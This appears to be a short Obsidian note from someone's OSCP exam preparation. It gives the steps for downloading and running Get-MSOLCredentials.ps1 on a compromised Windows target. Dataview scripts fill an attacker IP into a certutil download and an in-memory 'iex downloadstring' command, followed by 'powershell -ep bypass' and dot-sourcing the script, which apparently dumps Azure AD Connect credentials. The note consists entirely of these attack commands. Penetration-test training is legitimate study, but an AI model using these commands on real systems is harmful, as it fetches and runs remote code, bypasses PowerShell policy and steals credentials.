## Download Get-MSOLCredentials.ps1 onto target

```
cd ~/Desktop/Tools/Windows/ && python -m http.server 80
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/Get-MSOLCredentials.ps1 Get-MSOLCredentials.ps1`;

dv.paragraph("```bash\n" + command + "\n```");
```
or

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `iex(new-object net.webclient).downloadstring('http://${KaliIP}:80/Get-MSOLCredentials.ps1')`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
powershell -ep bypass
```

```
. .\Get-MSOLCredentials.ps1
```